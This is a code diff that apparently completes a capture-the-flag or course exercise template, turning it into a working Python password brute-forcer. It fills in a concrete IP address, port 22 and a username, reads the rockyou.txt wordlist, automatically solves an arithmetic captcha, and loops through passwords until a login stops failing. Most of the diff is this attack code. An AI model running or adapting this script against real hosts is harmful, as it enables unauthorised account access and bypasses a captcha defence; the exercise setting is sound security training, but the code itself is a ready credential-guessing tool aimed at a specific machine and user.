@@ -26,12 +26,12 @@
 
 import socket
 
-host = "" # IP address here
-port = 0000 # Port here
+host = "157.230.179.99" # IP address here
+port = 22 # Port here
 wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
 
 def brute_force():
-    """
+	"""
         Sockets: https://docs.python.org/2/library/socket.html
         How to use the socket s:
 
@@ -53,13 +53,61 @@ def brute_force():
             Given that you know a potential username, use a wordlist and iterate
             through each possible password and repeatedly attempt to login to
             v0idcache's server.
-    """
+	"""
 
-    username = ""   # Hint: use OSINT
-    password = ""   # Hint: use wordlist
+	file = open(wordlist, "r")
+
+	username = "ejnorman" #Hint: use OSINT
+	final_password = "none"
+
+	for line in file:
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect((host, port))
+
+		data = s.recv(1024)
+		print(data)
+
+		password = line #Hint: use wordlist
+
+		captcha = data.split()
+		first_num = float(captcha[0])
+		second_num = float(captcha[2])
+		operator = captcha[1]
+
+		if operator == "+":
+			result = first_num + second_num
+		elif operator == "-":
+			result = first_num - second_num
+		elif operator == "*":
+			result = first_num * second_num
+		elif operator == "/":
+			result = first_num / second_num
+		else:
+			print("Unidentified operator")
+
+		s.send(result + "\n")
+
+		str_after_cap = s.recv(1024)
+		print(str_after_cap)
+
+		s.send(username + "\n")
+
+		str_after_usr = s.recv(1024)
+		print(str_after_usr)
+
+		s.send(password + "\n")
+
+		str_after_pswd = s.recv(1024)
+
+		if str_after_pswd != "Fail":
+			final_password = password
+			break
 
 
+	file.close()
+
+	print(final_password)
 
 
 if __name__ == '__main__':
-    brute_force()
+	brute_force()
